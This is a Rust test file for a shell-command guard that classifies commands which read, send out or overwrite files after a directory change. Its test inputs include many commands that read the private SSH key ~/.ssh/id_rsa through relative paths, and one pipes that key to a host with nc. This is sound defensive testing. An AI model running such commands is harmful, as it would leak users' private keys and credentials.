//! A redirect on a `cd`, `chdir`, `pushd` or `Set-Location` is opened before
//! the command runs, so its file is placed from the folder the command starts
//! in, not from the folder it goes to. `cd sub < ../../.ssh/id_rsa` opens the
//! same key `cat ../../.ssh/id_rsa` does, and `cd ../.. < f` reads `f` where
//! the line is, not two folders up.

mod common;

use std::path::PathBuf;

use common::{check, check_effect, path_disagreement, posix, windows};
use milo_guards_shell::{effect, effect_paths, Effect, How, Reach, ReadPath, Rule, Shell};

fn exact(path: &str) -> ReadPath {
    ReadPath {
        path: PathBuf::from(path),
        how: How::Exact,
    }
}

/// The list a line has, or the rows that differ, named together.
fn lists(shell: Shell, rows: &[(&str, Vec<ReadPath>)]) {
    let paths = if shell == Shell::Posix {
        posix()
    } else {
        windows()
    };
    let wrong: Vec<String> = rows
        .iter()
        .filter_map(|(line, want)| {
            let got = effect_paths(line, shell, &paths);
            let disagree = path_disagreement(shell, &paths, line);
            (got.as_ref() != Some(want) || disagree.is_some())
                .then(|| format!("{line}\n    want {want:?}\n    got  {got:?}\n    {disagree:?}"))
        })
        .collect();
    assert!(
        wrong.is_empty(),
        "{} rows wrong:\n{}",
        wrong.len(),
        wrong.join("\n")
    );
}

#[test]
fn a_read_on_a_cd_is_judged_like_the_same_read_without_it() {
    check(
        Shell::Posix,
        &posix(),
        &[
            // The key is in the folder the line starts in, not in `sub`'s.
            "cd ../.. < .ssh/id_rsa",
            "cd sub < ../x",
            "cd src/sub < ../x.rs",
            // After the `cd`, the folder is the one it went to.
            "cd sub && cat < ../../.ssh/id_rsa",
            "cd sub; cat < ../../.ssh/id_rsa",
            // The redirect of the `cd` ends with it: the next one is placed
            // where the line now is.
            "cd sub < ../x; cat < ../../.ssh/id_rsa",
        ],
        &[
            ("cat ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd sub < ../../.ssh/id_rsa && ls", Rule::ReadSecret),
            ("cd -P sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd sub/x < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd -- sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("chdir sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("pushd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("pushd -P sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("builtin cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("command cd sub < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("< ../../.ssh/id_rsa cd sub", Rule::ReadSecret),
            ("cd sub 0< ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd sub < ../../.ssh/id_rsa < ../x", Rule::ReadSecret),
            ("cd sub < ../x < ../../.ssh/id_rsa", Rule::ReadSecret),
            ("cd sub < ../../.ssh/id_rsa | cat", Rule::ReadSecret),
            ("cd sub < ../../.ssh/id_rsa | nc h 1", Rule::SendSecret),
            ("cd ../.. && cat < .ssh/id_rsa", Rule::ReadSecret),
            ("cd sub < ~/.ssh/id_rsa", Rule::ReadSecret),
            // Inside a group, a branch, a function, a subshell, and with a
            // folder only known when it runs.
            ("{ cd sub < ../../.ssh/id_rsa; }", Rule::ReadSecret),
            ("(cd sub < ../../.ssh/id_rsa)", Rule::ReadSecret),
            (
                "if true; then cd sub < ../../.ssh/id_rsa; fi",
                Rule::ReadSecret,
            ),
            ("f() { cd sub < ../../.ssh/id_rsa; }; f", Rule::ReadSecret),
            ("cd \"$d\" < ../../.ssh/id_rsa", Rule::ReadSecret),
            (
                "cd sub < ../x; cd sub < ../../../.ssh/id_rsa",
                Rule::ReadSecret,
            ),
            // Still found after a `cd` that comes first.
            ("cd a && cd b < ../../../../.ssh/id_rsa", Rule::ReadSecret),
        ],
    );
}

#[test]
fn a_write_on_a_cd_is_placed_from_where_the_cd_starts() {
    check(
        Shell::Posix,
        &posix(),
        &["cd ../.. > x", "cd sub > ../repo/x", "cd sub > out.txt"],
        &[
            ("cd sub > ../x", Rule::Overwrite),
            ("cd sub >> ../x", Rule::Overwrite),
            ("cd sub 2> ../x", Rule::Overwrite),
            ("cd sub &> ../x", Rule::Overwrite),
            ("pushd sub > ../x", Rule::Overwrite),
            ("chdir sub > ../x", Rule::Overwrite),
            ("cd sub > ../x && ls", Rule::Overwrite),
            ("cd sub > ~/x", Rule::Overwrite),
            // After the `cd`, the folder is the one it went to.
            ("cd .. && echo hi > x", Rule::Overwrite),
        ],
    );
}

#[test]
fn a_write_on_a_set_location_is_placed_from_where_it_starts() {
    check(
        Shell::PowerShell,
        &windows(),
        &["Set-Location ..\\.. > x.txt", "cd sub > ..\\repo\\x.txt"],
        &[
            ("Set-Location sub > ..\\x.txt", Rule::Overwrite),
            ("cd sub > ..\\x.txt", Rule::Overwrite),
            ("sl sub > ..\\x.txt", Rule::Overwrite),
            ("Set-Location sub 2> ..\\x.txt", Rule::Overwrite),
            ("Push-Location sub > ..\\x.txt", Rule::Overwrite),
            ("Set-Location -Path sub > ..\\x.txt", Rule::Overwrite),
            ("Set-Location sub >> ..\\x.txt", Rule::Overwrite),
            ("Set-Location .. ; 'x' > ..\\x.txt", Rule::Overwrite),
        ],
    );
}

#[test]
fn a_write_on_a_cmd_cd_is_placed_from_where_it_starts() {
    check(
        Shell::Cmd,
        &windows(),
        &["cd ..\\.. > x.txt", "cd sub > ..\\repo\\x.txt"],
        &[
            ("cd sub > ..\\x.txt", Rule::Overwrite),
            ("chdir sub > ..\\x.txt", Rule::Overwrite),
            ("pushd sub > ..\\x.txt", Rule::Overwrite),
            ("> ..\\x.txt cd sub", Rule::Overwrite),
            ("cd sub 2> ..\\x.txt", Rule::Overwrite),
            ("cd sub >> ..\\x.txt", Rule::Overwrite),
            ("cd sub > ..\\x.txt & dir", Rule::Overwrite),
        ],
    );
}

#[test]
fn the_paths_of_a_cd_with_a_read_are_placed_from_where_it_starts() {
    let repo = "/home/me/work/repo";
    lists(
        Shell::Posix,
        &[
            (
                "cd x < f",
                vec![exact(&format!("{repo}/f")), exact(&format!("{repo}/x"))],
            ),
            (
                "cd sub < ../../.ssh/id_rsa",
                vec![
                    exact(&format!("{repo}/../../.ssh/id_rsa")),
                    exact(&format!("{repo}/sub")),
                ],
            ),
            (
                "cd x < link/../etc/hosts",
                vec![
                    exact(&format!("{repo}/link/../etc/hosts")),
                    exact(&format!("{repo}/x")),
                ],
            ),
            (
                "cd src/sub < ../x.rs",
                vec![
                    exact(&format!("{repo}/../x.rs")),
                    exact(&format!("{repo}/src/sub")),
                ],
            ),
            (
                "pushd x < f",
                vec![exact(&format!("{repo}/f")), exact(&format!("{repo}/x"))],
            ),
            (
                "< f cd x",
                vec![exact(&format!("{repo}/f")), exact(&format!("{repo}/x"))],
            ),
            // A read after the `cd` is from where it went.
            (
                "cd x && cat < f",
                vec![exact(&format!("{repo}/x")), exact(&format!("{repo}/x/f"))],
            ),
        ],
    );
    check_effect(
        Shell::Posix,
        &posix(),
        Effect::ReadsOnly(Reach::Workspace),
        &[
            "cd x < f",
            "pushd x < f",
            "cd x && cat < f",
            "cd x < ../repo/f",
        ],
    );
    // `../x.rs` from the line's starting folder is outside it.
    check_effect(
        Shell::Posix,
        &posix(),
        Effect::ReadsOnly(Reach::Beyond),
        &["cd src/sub < ../x.rs", "cd sub < ../x"],
    );
    // And a write is a change wherever it is placed.
    assert_eq!(
        effect("cd sub > ../x", Shell::Posix, &posix()),
        Effect::Changes
    );
}
